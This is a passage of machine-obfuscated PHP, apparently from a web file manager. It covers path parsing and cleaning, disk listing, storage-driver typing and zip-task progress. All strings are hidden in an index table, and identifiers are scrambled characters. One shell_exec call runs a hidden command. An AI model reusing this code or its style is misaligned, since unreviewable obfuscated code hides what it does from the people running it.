file_put_contents(DATA_PATH . $û¬ŸÃ„İ[1237], $û¬ŸÃ„İ[12]); Model($û¬ŸÃ„İ[1301])->set($û¬ŸÃ„İ[1302], $Îèñøì); } return $Îèñøì; } $Îèñøì = DATA_PATH . $û¬ŸÃ„İ[1303] . rand_string(8) . $û¬ŸÃ„İ[8]; $Îèñøì = IO::mkdir($Îèñøì); $Îèñøì = rtrim($Îèñøì, $û¬ŸÃ„İ[8]) . $û¬ŸÃ„İ[8]; file_put_contents($Îèñøì . $û¬ŸÃ„İ[1237], $û¬ŸÃ„İ[12]); file_put_contents(DATA_PATH . $û¬ŸÃ„İ[1237], $û¬ŸÃ„İ[12]); Model($û¬ŸÃ„İ[1301])->set($û¬ŸÃ„İ[1302], $Îèñøì); return $Îèñøì; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\162\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\162\122\x65\143\x79\x63\x6c\145\175"; const KOD_USER_FAV = "\173\165\163\145\x72\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\x72\106\x69\x6c\x65\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\162\x46\x69\154\x65\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\x75\x70\x52\157\157\x74\123\x65\154\146\x7d"; const KOD_USER_SHARE = "\173\x75\x73\145\x72\123\150\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\x72\123\150\141\x72\145\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\162\145\124\157\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\162\x65\111\164\145\155\175"; const KOD_SHARE_LINK = "\x7b\163\x68\141\162\x65\111\164\145\155\x4c\151\156\x6b\x7d"; const KOD_SEARCH = "\x7b\163\x65\x61\162\143\150\175"; const KOD_BLOCK = "\173\142\154\x6f\143\153\175"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\173\165\x73\x65\162\x52\x65\156\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\144\162\x69\x76\145\162\175"; public static function typeList() { $Íî¨•·‚ =& $_SERVER[Ö†ØøÖ±]; return array($Íî¨•·‚[1304] => self::KOD_SOURCE, $Íî¨•·‚[1305] => self::KOD_USER_RECYCLE, $Íî¨•·‚[1306] => self::KOD_USER_FAV, $Íî¨•·‚[1307] => self::KOD_USER_FILE_TAG, $Íî¨•·‚[1308] => self::KOD_USER_FILE_TYPE, $Íî¨•·‚[1309] => self::KOD_GROUP_ROOT_SELF, $Íî¨•·‚[1310] => self::KOD_USER_SHARE, $Íî¨•·‚[1311] => self::KOD_USER_SHARE_LINK, $Íî¨•·‚[1312] => self::KOD_USER_SHARE_TO_ME, $Íî¨•·‚[1313] => self::KOD_SHARE_ITEM, $Íî¨•·‚[1314] => self::KOD_SHARE_LINK, $Íî¨•·‚[1315] => self::KOD_SEARCH, $Íî¨•·‚[1316] => self::KOD_BLOCK, $Íî¨•·‚[1317] => self::KOD_IO, $Íî¨•·‚[1318] => self::KOD_USER_RECENT, $Íî¨•·‚[1319] => self::KOD_USER_DRIVER); } public static function parse($†ÊîÒÅ§) { $ô°¿Òıù =& $_SERVER[Ö†ØøÖ±]; $†ÊîÒÅ§ = self::clear($†ÊîÒÅ§); $á¼èÈÓ = array_values(self::typeList()); preg_match($ô°¿Òıù[1320], $†ÊîÒÅ§, $È§ÜáãØ); $ÁÆÆˆ­ = array($ô°¿Òıù[473] => !1, $ô°¿Òıù[1321] => !1, $ô°¿Òıù[470] => !1, $ô°¿Òıù[84] => $†ÊîÒÅ§, $ô°¿Òıù[1222] => !1, $ô°¿Òıù[1221] => $ô°¿Òıù[12]); if (is_array($È§ÜáãØ) && count($È§ÜáãØ) == 5) { $ÌÔ‰ïÑı = $ô°¿Òıù[1322] . $È§ÜáãØ[2] . $ô°¿Òıù[380]; if (in_array($ÌÔ‰ïÑı, $á¼èÈÓ)) { $ÁÆÆˆ­[$ô°¿Òıù[1222]] = $È§ÜáãØ[1]; $ÁÆÆˆ­[$ô°¿Òıù[33]] = $ÌÔ‰ïÑı; $ÁÆÆˆ­[$ô°¿Òıù[1323]] = substr($ÌÔ‰ïÑı, 1, -1); $ÁÆÆˆ­[$ô°¿Òıù[451]] = $È§ÜáãØ[3]; } $ÁÆÆˆ­[$ô°¿Òıù[1221]] = $È§ÜáãØ[4]; } $‰Î«­ºú = array($ô°¿Òıù[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÁÆÆˆ­[$ô°¿Òıù[1286]] = in_array($ÁÆÆˆ­[$ô°¿Òıù[33]], $‰Î«­ºú); return $ÁÆÆˆ­; } public static function isTruePath($¿¼§¾Áâ) { $ãøÖº =& $_SERVER[Ö†ØøÖ±]; if (substr($¿¼§¾Áâ, 0, 1) != $ãøÖº[1322]) { return !0; } if (strpos($¿¼§¾Áâ, $ãøÖº[460]) === 0) { return !0; } if (strpos($¿¼§¾Áâ, $ãøÖº[1290]) === 0) { return !0; } if (strpos($¿¼§¾Áâ, $ãøÖº[1324]) === 0) { return !0; } if (strpos($¿¼§¾Áâ, $ãøÖº[1325]) === 0) { return !0; } if (strpos($¿¼§¾Áâ, $ãøÖº[1326]) === 0) { return !0; } return !1; } public static function clear($ÁË¾ş†) { $¾ê‡‡µ =& $_SERVER[Ö†ØøÖ±]; $ÁË¾ş† = str_replace(array($¾ê‡‡µ[1131], $¾ê‡‡µ[246]), $¾ê‡‡µ[53], $ÁË¾ş†); $ÁË¾ş† = str_replace($¾ê‡‡µ[97], $¾ê‡‡µ[8], $ÁË¾ş†); $—¸ñ¹æ“ = $¾ê‡‡µ[1327]; if (substr($ÁË¾ş†, 0, 3) == $¾ê‡‡µ[1328]) { $ÁË¾ş† = substr($ÁË¾ş†, 3); } while (strstr($ÁË¾ş†, $—¸ñ¹æ“)) { $ÁË¾ş† = str_replace($—¸ñ¹æ“, $¾ê‡‡µ[8], $ÁË¾ş†); } $ÁË¾ş† = preg_replace($¾ê‡‡µ[1329], $¾ê‡‡µ[8], $ÁË¾ş†); if ($ÁË¾ş† == $¾ê‡‡µ[8]) { return $¾ê‡‡µ[8]; } $ÁË¾ş† = rtrim($ÁË¾ş†, $¾ê‡‡µ[8]); return $ÁË¾ş†; } public static function pathTrue($î‹‡¿’) { $·ûÚ†ÓÅ =& $_SERVER[Ö†ØøÖ±]; if (!$î‹‡¿’) { return $·ûÚ†ÓÅ[12]; } $î‹‡¿’ = str_replace($·ûÚ†ÓÅ[570], $·ûÚ†ÓÅ[8], str_replace($·ûÚ†ÓÅ[1330], $·ûÚ†ÓÅ[8], $î‹‡¿’)); $î‹‡¿’ = str_replace($·ûÚ†ÓÅ[570], $·ûÚ†ÓÅ[8], str_replace($·ûÚ†ÓÅ[1330], $·ûÚ†ÓÅ[8], $î‹‡¿’)); if (!strstr($î‹‡¿’, $·ûÚ†ÓÅ[1328])) { return $î‹‡¿’; } $¬çÄŒ  = explode($·ûÚ†ÓÅ[8], $î‹‡¿’); foreach ($¬çÄŒ  as $´áä‡ı => $®¨Çş¾×) { if ($®¨Çş¾× !== $·ûÚ†ÓÅ[1331]) { continue; } for ($ŸŞ¾°ƒÅ = $´áä‡ı; $ŸŞ¾°ƒÅ >= 0; $ŸŞ¾°ƒÅ--) { if ($¬çÄŒ [$ŸŞ¾°ƒÅ] === $·ûÚ†ÓÅ[10] || $¬çÄŒ [$ŸŞ¾°ƒÅ] === $·ûÚ†ÓÅ[1331] || $¬çÄŒ [$ŸŞ¾°ƒÅ] === -1) { continue; } if ($¬çÄŒ [$ŸŞ¾°ƒÅ] === $·ûÚ†ÓÅ[12]) { $¬çÄŒ [$´áä‡ı] = -1; break; } $¬çÄŒ [$´áä‡ı] = -1; $¬çÄŒ [$ŸŞ¾°ƒÅ] = -1; break; } } $Üİ¨òÓö = array(); foreach ($¬çÄŒ  as $®¨Çş¾×) { if ($®¨Çş¾× !== -1) { $Üİ¨òÓö[] = $®¨Çş¾×; } } $»ı«âÌ¾ = implode($·ûÚ†ÓÅ[8], $Üİ¨òÓö); if (strpos($»ı«âÌ¾, $·ûÚ†ÓÅ[1332]) === 0) { $»ı«âÌ¾ = $·ûÚ†ÓÅ[1328] . substr($»ı«âÌ¾, strlen($·ûÚ†ÓÅ[1332])); } return $»ı«âÌ¾; } public static function sourceID($Úè´­Şã) { $ŒŞÈìî =& $_SERVER[Ö†ØøÖ±]; $ŒÕíª¨£ = self::parse($Úè´­Şã); if ($ŒÕíª¨£[$ŒŞÈìî[33]] !== self::KOD_SOURCE) { show_json(LNG($ŒŞÈìî[1333]), !1); } return $ŒÕíª¨£[$ŒŞÈìî[451]]; } public static function make($ÎøÄüÂ¬) { if (!$ÎøÄüÂ¬) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÎøÄüÂ¬)); } public static function makeShare($†ù¨æ¶, $ÅûÙË¾Ê) { return self::makePath(self::KOD_SHARE_ITEM, $†ù¨æ¶, $ÅûÙË¾Ê); } public static function makeFileTypePath($Ç¡Ïœ•) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ç¡Ïœ•); } public static function makeFileTagPath($¡±øØşß) { return self::makePath(self::KOD_USER_FILE_TAG, $¡±øØşß); } public static function makePath($æõÈçÉ, $·ù·³ = '', $ø°şÛÒ = '') { $š«¦€‹í =& $_SERVER[Ö†ØøÖ±]; $¦…úñÉï = substr($æõÈçÉ, 1, -1); $òíá‰¤Ø = $š«¦€‹í[1334] . $¦…úñÉï . $š«¦€‹í[1335] . $·ù·³ . $š«¦€‹í[1336]; $òíá‰¤Ø = $ø°şÛÒ ? $òíá‰¤Ø . $ø°şÛÒ . $š«¦€‹í[8] : $òíá‰¤Ø; return $òíá‰¤Ø; } public static function hashPath($óÖá—œø, $°¯ººœ = true) { $üÙ÷Ñü =& $_SERVER[Ö†ØøÖ±]; $¦‘º¬ªÍ = is_array($óÖá—œø) ? $óÖá—œø : IO::info($óÖá—œø); $Éª×¶ÖÊ = _get($¦‘º¬ªÍ, $üÙ÷Ñü[1337], $üÙ÷Ñü[12]); if (!$Éª×¶ÖÊ && isset($¦‘º¬ªÍ[$üÙ÷Ñü[219]])) { $Éª×¶ÖÊ = trim($¦‘º¬ªÍ[$üÙ÷Ñü[219]], $üÙ÷Ñü[118]); } if (!$Éª×¶ÖÊ && isset($¦‘º¬ªÍ[$üÙ÷Ñü[181]]) && $¦‘º¬ªÍ[$üÙ÷Ñü[181]]) { $¦‘º¬ªÍ = IO::info(KodIO::make($¦‘º¬ªÍ[$üÙ÷Ñü[181]])); $Éª×¶ÖÊ = _get($¦‘º¬ªÍ, $üÙ÷Ñü[1337], $üÙ÷Ñü[12]); } $ïşÍ“ = md5($¦‘º¬ªÍ[$üÙ÷Ñü[84]] . $¦‘º¬ªÍ[$üÙ÷Ñü[76]] . $¦‘º¬ªÍ[$üÙ÷Ñü[85]]); if (!$Éª×¶ÖÊ && file_exists($¦‘º¬ªÍ[$üÙ÷Ñü[84]])) { $Éª×¶ÖÊ = Cache::get($ïşÍ“ . $üÙ÷Ñü[1338]); $Éª×¶ÖÊ = !1; if (!$Éª×¶ÖÊ) { $Éª×¶ÖÊ = IO::hashSimple($¦‘º¬ªÍ[$üÙ÷Ñü[84]]); Cache::set($ïşÍ“ . $üÙ÷Ñü[1338], $Éª×¶ÖÊ, 3600 * 24 * 30); } } if ($°¯ººœ && !$Éª×¶ÖÊ) { } return $Éª×¶ÖÊ ? $Éª×¶ÖÊ : $ïşÍ“; } public static function hashPathSafe($ôğô¢é–, $œÈ¦ë § = true) { $„¾¤úİı =& $_SERVER[Ö†ØøÖ±]; $»å«¨Š = self::hashPath($ôğô¢é–, $œÈ¦ë §); return md5($»å«¨Š . $„¾¤úİı[1339] . Model($„¾¤úİı[823])->get($„¾¤úİı[824])); } public static function initSystemPath() { $óê”éÈ =& $_SERVER[Ö†ØøÖ±]; if (defined($óê”éÈ[1340])) { return; } define($óê”éÈ[1340], self::systemPath($óê”éÈ[179])); define($óê”éÈ[1341], self::systemPath($óê”éÈ[1342])); define($óê”éÈ[1343], self::systemPath($óê”éÈ[1344])); define($óê”éÈ[1345], self::systemPath($óê”éÈ[1346])); IOHistory::bindEvent(); } public static function systemPath($ƒğ±êê€) { $®Š±çÖÌ =& $_SERVER[Ö†ØøÖ±]; $ë¿¦²Ù¥ = $®Š±çÖÌ[1347] . ucfirst($ƒğ±êê€); $Ê•ÅÄ = Model($®Š±çÖÌ[823])->get($ë¿¦²Ù¥); if ($Ê•ÅÄ) { return $Ê•ÅÄ; } if ($ƒğ±êê€ == $®Š±çÖÌ[179]) { $Ê•ÅÄ = self::make(Model($®Š±çÖÌ[878])->systemRootPathAdd($®Š±çÖÌ[583])); } else { $Ê•ÅÄ = self::systemPath($®Š±çÖÌ[179]); $í‰óƒ·¢ = self::sourceID($Ê•ÅÄ); $Ê•ÅÄ = self::make(Model($®Š±çÖÌ[878])->mkdir($í‰óƒ·¢, $ƒğ±êê€)); } Model($®Š±çÖÌ[823])->set($ë¿¦²Ù¥, $Ê•ÅÄ); return $Ê•ÅÄ; } public static function systemFolder($àòãÑï) { $Š”«•‚Œ = IO_PATH_SYSTEM_SOURCE . $àòãÑï; $“”¸ã¤é = Cache::get($Š”«•‚Œ); if (!$“”¸ã¤é) { $ô•á½»½ = IO::infoFullSimple($Š”«•‚Œ); if (!$ô•á½»½) { $“”¸ã¤é = IO::mkdir($Š”«•‚Œ, REPEAT_SKIP); } else { $“”¸ã¤é = $ô•á½»½[$_SERVER[Ö†ØøÖ±][84]]; } Cache::set($Š”«•‚Œ, $“”¸ã¤é, 3600 * 10); } return $“”¸ã¤é; } public static function defaultDriver() { return Model($_SERVER[Ö†ØøÖ±][820])->defaultDriver(); } public static function defaultIO() { $ñœÙ®“¸ =& $_SERVER[Ö†ØøÖ±]; $›˜¾¤ì¢ = self::defaultDriver(); return $ñœÙ®“¸[1348] . $›˜¾¤ì¢[$ñœÙ®“¸[451]] . $ñœÙ®“¸[1336]; } public static function defaultDriverInit() { static $Úß¡òßƒ = false; if ($Úß¡òßƒ) { return $Úß¡òßƒ; } $Úß¡òßƒ = IO::init(self::defaultIO()); return $Úß¡òßƒ; } public static function fileTypeList() { $ÔÕœÍŠ¶ =& $_SERVER[Ö†ØøÖ±]; $ü»Ê°Ï = $GLOBALS[$ÔÕœÍŠ¶[6]][$ÔÕœÍŠ¶[1349]]; foreach ($ü»Ê°Ï as $ìË Şİ‹ => $¢İ‡Œ™­) { $¯¾Í­’ = $ÔÕœÍŠ¶[1350] . $ìË Şİ‹; $ŸŸ«£¤ = LNG($¯¾Í­’); if ($¯¾Í­’ != $ŸŸ«£¤) { $ü»Ê°Ï[$ìË Şİ‹][$ÔÕœÍŠ¶[32]] = $ŸŸ«£¤; } } return $ü»Ê°Ï; } public static function diskList($„ûÑßØ‘ = true) { $÷ß” — = $_SERVER[Ö†ØøÖ±][1351]; if ($„ûÑßØ‘) { $½¥Æñíš = Cache::get($÷ß” —); if (is_array($½¥Æñíš)) { return $½¥Æñíš; } } $½¥Æñíš = self::diskListGet(); Cache::set($÷ß” —, $½¥Æñíš, 60); return $½¥Æñíš; } public static function diskListGet() { $†òÄÉıĞ =& $_SERVER[Ö†ØøÖ±]; $ÅÑøé = array(); if ($GLOBALS[$†òÄÉıĞ[6]][$†òÄÉıĞ[1352]] == $†òÄÉıĞ[1353]) { $â‘¬¿× = $†òÄÉıĞ[1354]; for ($´ €Öå = 0; $´ €Öå < strlen($â‘¬¿×); $´ €Öå++) { $Ñ‘ÊÉ” = $â‘¬¿×[$´ €Öå] . $†òÄÉıĞ[1355]; if (file_exists($Ñ‘ÊÉ”)) { $ÅÑøé[] = $Ñ‘ÊÉ”; } } return $ÅÑøé; } if (!function_exists($†òÄÉıĞ[98])) { $ÅÑøé[] = $†òÄÉıĞ[889]; return $ÅÑøé; } $éí¹Š¿ = explode($†òÄÉıĞ[246], shell_exec($†òÄÉıĞ[1356])); array_shift($éí¹Š¿); array_pop($éí¹Š¿); $äÏ…û­Æ = array($†òÄÉıĞ[1357], $†òÄÉıĞ[1358], $†òÄÉıĞ[1359], $†òÄÉıĞ[1360], $†òÄÉıĞ[1361], $†òÄÉıĞ[1362], $†òÄÉıĞ[1363], $†òÄÉıĞ[1364]); foreach ($éí¹Š¿ as $û‡‡í´ˆ) { $º‹ËŒì­ = preg_split($†òÄÉıĞ[1365], $û‡‡í´ˆ); $Ñ‘ÊÉ” = $º‹ËŒì­[count($º‹ËŒì­) - 1]; if (!strstr($º‹ËŒì­[0], $†òÄÉıĞ[1366]) || !$Ñ‘ÊÉ”) { continue; } $ãŠÈòºŞ = rtrim($Ñ‘ÊÉ”, $†òÄÉıĞ[8]) . $†òÄÉıĞ[8]; if (in_array($ãŠÈòºŞ, $äÏ…û­Æ)) { continue; } $ÅÑøé[] = $ãŠÈòºŞ; } return $ÅÑøé; } public static function isSameDisk($ØË˜áë, $á‘™ùßÉ) { $ü‘œ¨ø¥ =& $_SERVER[Ö†ØøÖ±]; if ($GLOBALS[$ü‘œ¨ø¥[6]][$ü‘œ¨ø¥[1352]] == $ü‘œ¨ø¥[1353]) { return strtolower(substr($ØË˜áë, 0, 1)) == strtolower(substr($á‘™ùßÉ, 0, 1)); } $¯…œÉáò = self::diskList(); $ôúá€œ¨ = !1; $²Úèš¶Ô = !1; sort($¯…œÉáò); $¯…œÉáò = array_reverse($¯…œÉáò); $ØË˜áë = rtrim($ØË˜áë, $ü‘œ¨ø¥[8]) . $ü‘œ¨ø¥[8]; $á‘™ùßÉ = rtrim($á‘™ùßÉ, $ü‘œ¨ø¥[8]) . $ü‘œ¨ø¥[8]; foreach ($¯…œÉáò as $ŸıÚÂ…ê) { $õªç = strlen($ŸıÚÂ…ê); if (!$ôúá€œ¨ && substr($ØË˜áë, 0, $õªç) == $ŸıÚÂ…ê) { $ôúá€œ¨ = $ŸıÚÂ…ê; } if (!$²Úèš¶Ô && substr($á‘™ùßÉ, 0, $õªç) == $ŸıÚÂ…ê) { $²Úèš¶Ô = $ŸıÚÂ…ê; } if ($ôúá€œ¨ && $²Úèš¶Ô) { break; } } return $ôúá€œ¨ === $²Úèš¶Ô; } public static function transferType($ÚıÈ”¢, $æƒİ¦³) { $¦„Èìß =& $_SERVER[Ö†ØøÖ±]; $îÂÜ˜õÎ = self::driverType($ÚıÈ”¢); $ÛÔß¼•ë = self::driverType($æƒİ¦³); if ($îÂÜ˜õÎ[$¦„Èìß[33]] == $ÛÔß¼•ë[$¦„Èìß[33]] && $îÂÜ˜õÎ[$¦„Èìß[1367]] == $ÛÔß¼•ë[$¦„Èìß[1367]]) { return $¦„Èìß[1368]; } if ($îÂÜ˜õÎ[$¦„Èìß[33]] == $¦„Èìß[922] && $ÛÔß¼•ë[$¦„Èìß[33]] == $¦„Èìß[106]) { return $¦„Èìß[1247]; } if ($îÂÜ˜õÎ[$¦„Èìß[33]] == $¦„Èìß[106] && $ÛÔß¼•ë[$¦„Èìß[33]] == $¦„Èìß[922]) { return $¦„Èìß[107]; } return $¦„Èìß[1369]; } public static function driverType($ªˆåÄÏª) { $‡‘Âæüê =& $_SERVER[Ö†ØøÖ±]; $¢ÏËÒ´ù = str_replace($‡‘Âæüê[1370], $‡‘Âæüê[12], strtolower($ªˆåÄÏª->getType())); if ($¢ÏËÒ´ù == $‡‘Âæüê[810] || $¢ÏËÒ´ù == $‡‘Âæüê[1371] || $¢ÏËÒ´ù == $‡‘Âæüê[1372]) { $ªˆåÄÏª = self::defaultDriverInit(); } else { if ($¢ÏËÒ´ù == $‡‘Âæüê[1257] || $¢ÏËÒ´ù == $‡‘Âæüê[1373]) { $ªˆåÄÏª = IO::init($ªˆåÄÏª->pathParse[$‡‘Âæüê[1204]]); } } $´è’Áşñ = $ªˆåÄÏª->path; $¢ÏËÒ´ù = str_replace($‡‘Âæüê[1370], $‡‘Âæüê[12], strtolower($ªˆåÄÏª->getType())); if ($¢ÏËÒ´ù == $‡‘Âæüê[106]) { return array($‡‘Âæüê[33] => $‡‘Âæüê[106], $‡‘Âæüê[1367] => $‡‘Âæüê[12], $‡‘Âæüê[84] => $´è’Áşñ, $‡‘Âæüê[95] => $ªˆåÄÏª); } return array($‡‘Âæüê[33] => $‡‘Âæüê[922], $‡‘Âæüê[1367] => $ªˆåÄÏª->pathDriver, $‡‘Âæüê[84] => $´è’Áşñ, $‡‘Âæüê[95] => $ªˆåÄÏª); } public static function pathDriverType($ÄæÍÎâó) { return $ÄæÍÎâó ? self::driverType(IO::init($ÄæÍÎâó)) : !1; } public static function pathDriverLocal($ºƒ¼¸›–) { $õá›ß³¯ =& $_SERVER[Ö†ØøÖ±]; $£Ñ…“’ = $ºƒ¼¸›– ? self::driverType(IO::init($ºƒ¼¸›–)) : !1; return $£Ñ…“’[$õá›ß³¯[33]] == $õá›ß³¯[106] ? !0 : !1; } public static function allowCover($âéŒ¾, $ëì–´Äí = true) { $«¡Ö±ìŠ =& $_SERVER[Ö†ØøÖ±]; if (is_string($âéŒ¾)) { $âéŒ¾ = IO::info($âéŒ¾); } if (!$âéŒ¾ || $âéŒ¾[$«¡Ö±ìŠ[33]] == $«¡Ö±ìŠ[75] || $âéŒ¾[$«¡Ö±ìŠ[76]] <= 100) { return !1; } if (isset($âéŒ¾[$«¡Ö±ìŠ[1374]]) || !$âéŒ¾[$«¡Ö±ìŠ[84]]) { return !1; } if (isset($âéŒ¾[$«¡Ö±ìŠ[216]]) && !$âéŒ¾[$«¡Ö±ìŠ[216]]) { return !1; } static $¡«‘€ = false; if (!$¡«‘€ || !$ëì–´Äí) { $…’Ö—ñó = self::driverType(IO::init($âéŒ¾[$«¡Ö±ìŠ[84]])); $œ™³¹¤Ô = $…’Ö—ñó[$«¡Ö±ìŠ[95]]; $¡«‘€ = $«¡Ö±ìŠ[184]; if ($…’Ö—ñó[$«¡Ö±ìŠ[33]] == $«¡Ö±ìŠ[106]) { $¡«‘€ = $«¡Ö±ìŠ[1375]; } if ($…’Ö—ñó[$«¡Ö±ìŠ[95]] && is_array($…’Ö—ñó[$«¡Ö±ìŠ[95]]->config)) { $ñŸé³ÆÂ = $…’Ö—ñó[$«¡Ö±ìŠ[95]]->config; if (isset($ñŸé³ÆÂ[$«¡Ö±ìŠ[1376]]) && $ñŸé³ÆÂ[$«¡Ö±ìŠ[1376]]) { $¡«‘€ = $«¡Ö±ìŠ[1375]; } } } return $¡«‘€ == $«¡Ö±ìŠ[1375] ? !0 : !1; } } goto CÂ»½óíº„; D®ì‰Œ–„Š: define($_SERVER[Ö†ØøÖ±][285], 1); define($_SERVER[Ö†ØøÖ±][286], 0); define($_SERVER[Ö†ØøÖ±][287], 2); goto BÌœëÂÂÃ; Eìôƒ…µàï: class TaskZip extends TaskFileTransfer { protected function startAfter() { $”Ì÷¡‡ =& $_SERVER[Ö†ØøÖ±]; parent::startAfter(); Hook::bind($”Ì÷¡‡[1823], array($this, $”Ì÷¡‡[1813])); Hook::bind($”Ì÷¡‡[1815], array($this, $”Ì÷¡‡[1816])); $ƒ‚Ìµçó =& $this->task; $ƒ‚Ìµçó[$”Ì÷¡‡[1817]] = $”Ì÷¡‡[1247]; if (!$ƒ‚Ìµçó[$”Ì÷¡‡[1596]]) { $ƒ‚Ìµçó[$”Ì÷¡‡[1596]] = LNG($”Ì÷¡‡[1824]); } } protected function endAfter() { $ñâç¥´¨ =& $_SERVER[Ö†ØøÖ±]; parent::endAfter(); Hook::unbind($ñâç¥´¨[1823], array($this, $ñâç¥´¨[1813])); Hook::unbind($ñâç¥´¨[1815], array($this, $ñâç¥´¨[1816])); } public function updateAfter() { $ŒÁâÄ£Ô =& $_SERVER[Ö†ØøÖ±]; $‚Îµ®¶ =& $this->task; if (!$‚Îµ®¶[$ŒÁâÄ£Ô[839]] || !$‚Îµ®¶[$ŒÁâÄ£Ô[816]]) { return; } if ($‚Îµ®¶[$ŒÁâÄ£Ô[1817]] == $ŒÁâÄ£Ô[1247]) { $÷ŒùíÉÊ = $‚Îµ®¶[$ŒÁâÄ£Ô[1753]]; if ($‚Îµ®¶[$ŒÁâÄ£Ô[1754]] != $ŒÁâÄ£Ô[1247]) { $÷ŒùíÉÊ = 0; } $Á×Ñ„ÄÊ = ($‚Îµ®¶[$ŒÁâÄ£Ô[1757]] + $÷ŒùíÉÊ) / $‚Îµ®¶[$ŒÁâÄ£Ô[816]]; $‚Îµ®¶[$ŒÁâÄ£Ô[1701]] = $Á×Ñ„ÄÊ * 0.3; } else { if ($‚Îµ®¶[$ŒÁâÄ£Ô[1817]] == $ŒÁâÄ£Ô[366]) { $Á×Ñ„ÄÊ = $‚Îµ®¶[$ŒÁâÄ£Ô[1700]] / $‚Îµ®¶[$ŒÁâÄ£Ô[839]]; $‚Îµ®¶[$ŒÁâÄ£Ô[1701]] = 0.3 + $Á×Ñ„ÄÊ * 0.5; } else { if ($‚Îµ®¶[$ŒÁâÄ£Ô[1817]] == $ŒÁâÄ£Ô[107]) { $Á×Ñ„ÄÊ = 0; if ($‚Îµ®¶[$ŒÁâÄ£Ô[1752]]) { $Á×Ñ„ÄÊ = $‚Îµ®¶[$ŒÁâÄ£Ô[1753]] / $‚Îµ®¶[$ŒÁâÄ£Ô[1752]]; } $‚Îµ®¶[$ŒÁâÄ£Ô[1701]] = 0.3 + 0.5 + $Á×Ñ„ÄÊ * 0.2; } } } if ($‚Îµ®¶[$ŒÁâÄ£Ô[1701]] > 0) { $œ¯Å¬å = timeFloat() - $‚Îµ®¶[$ŒÁâÄ£Ô[1703]] - $‚Îµ®¶[$ŒÁâÄ£Ô[1706]]; $‚Îµ®¶[$ŒÁâÄ£Ô[1707]] = $œ¯Å¬å * (1 - $‚Îµ®¶[$ŒÁâÄ£Ô[1701]]) / $‚Îµ®¶[$ŒÁâÄ£Ô[1701]]; } } public function copyFileStart($ûÇ¼ŞŒ, $ŠøÖ±ù×, $ÑŞé–Æ, $ªâ†¯¬å, $åÕ¬ØşÒ, $ï…ÂÛ“’) { $êĞî—³† =& $_SERVER[Ö†ØøÖ±]; parent::copyFileStart($ûÇ¼ŞŒ, $ŠøÖ±ù×, $ÑŞé–Æ, $ªâ†¯¬å, $åÕ¬ØşÒ, $ï…ÂÛ“’); $üÏÓµƒ =& $this->task; if ($üÏÓµƒ[$êĞî—³†[1817]] == $êĞî—³†[366]) { $üÏÓµƒ[$êĞî—³†[1817]] = $êĞî—³†[107]; } $this->update(); } public function copyFileEnd($óáÇåÎØ, $ÍğõçÅç, $êŠùù‘‘, $†­à°ŒÎ, $ƒÙ¸Ğ¢, $ÙóıìÀ) { $µ–ô«ÜÚ =& $_SERVER[Ö†ØøÖ±]; $¼÷ÎÏô» =& $this->task; $¼÷ÎÏô»[$µ–ô«ÜÚ[1753]] = $¼÷ÎÏô»[$µ–ô«ÜÚ[1752]]; $¼÷ÎÏô»[$µ–ô«ÜÚ[1757]] += $¼÷ÎÏô»[$µ–ô«ÜÚ[1752]]; $¼÷ÎÏô»[$µ–ô«ÜÚ[1754]] = $µ–ô«ÜÚ[12]; $this->update(); } public function zipEvent($¸—™¦ö‘, $Ø£¸ˆ±ª, $¦İ–¢·Ã, $æĞô¨º—) { $íõŸÓ½µ =& $_SERVER[Ö†ØøÖ±]; $Œ‘úìÍ =& $this->task; $Œ‘úìÍ[$íõŸÓ½µ[1750]] = get_path_this($Ø£¸ˆ±ª); $Œ‘úìÍ[$íõŸÓ½µ[1752]] = $æĞô¨º—; $Œ‘úìÍ[$íõŸÓ½µ[1753]] = $¦İ–¢·Ã; $Œ‘úìÍ[$íõŸÓ½µ[1117]] = $¸—™¦ö‘ == $íõŸÓ½µ[1825] ? $íõŸÓ½µ[1820] : $íõŸÓ½µ[1821]; $Œ‘úìÍ[$íõŸÓ½µ[1754]] = $íõŸÓ½µ[12]; $Œ‘úìÍ[$íõŸÓ½µ[816]] = $æĞô¨º—; $Œ‘úìÍ[$íõŸÓ½µ[1817]] = $íõŸÓ½µ[366]; $this->update(); } public function nameParse($í—Êµ) { $éÃ¹¦ŠÎ =& $_SERVER[Ö†ØøÖ±]; $©éÏ’ˆ­ =& $this->task; if ($©éÏ’ˆ­[$éÃ¹¦ŠÎ[1700]] < $©éÏ’ˆ­[$éÃ¹¦ŠÎ[839]]) { $ÃÛ•ˆîì = get_path_this($í—Êµ); if (strstr($ÃÛ•ˆîì, $éÃ¹¦ŠÎ[10])) { $©éÏ’ˆ­[$éÃ¹¦ŠÎ[1700]] += 1; } } if ($©éÏ’ˆ­[$éÃ¹¦ŠÎ[1817]] == $éÃ¹¦ŠÎ[1247]) { $©éÏ’ˆ­[$éÃ¹¦ŠÎ[1817]] = $éÃ¹¦ŠÎ[366]; } $©éÏ’ˆ­[$éÃ¹¦ŠÎ[1750]] = $í—Êµ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($®èĞİı) { $ÉºÍ”¸å =& $_SERVER[Ö†ØøÖ±]; $ÁÖŒµÑ = array($ÉºÍ”¸å[639] => array($ÉºÍ”¸å[33] => $ÉºÍ”¸å[1826], $ÉºÍ”¸å[326] => array($ÉºÍ”¸å[239], $ÉºÍ”¸å[818], $ÉºÍ”¸å[1827], $ÉºÍ”¸å[1828])), $ÉºÍ”¸å[1829] => array($ÉºÍ”¸å[33] => $ÉºÍ”¸å[1830], $ÉºÍ”¸å[326] => array($ÉºÍ”¸å[239], $ÉºÍ”¸å[816], $ÉºÍ”¸å[1831], $ÉºÍ”¸å[1832], 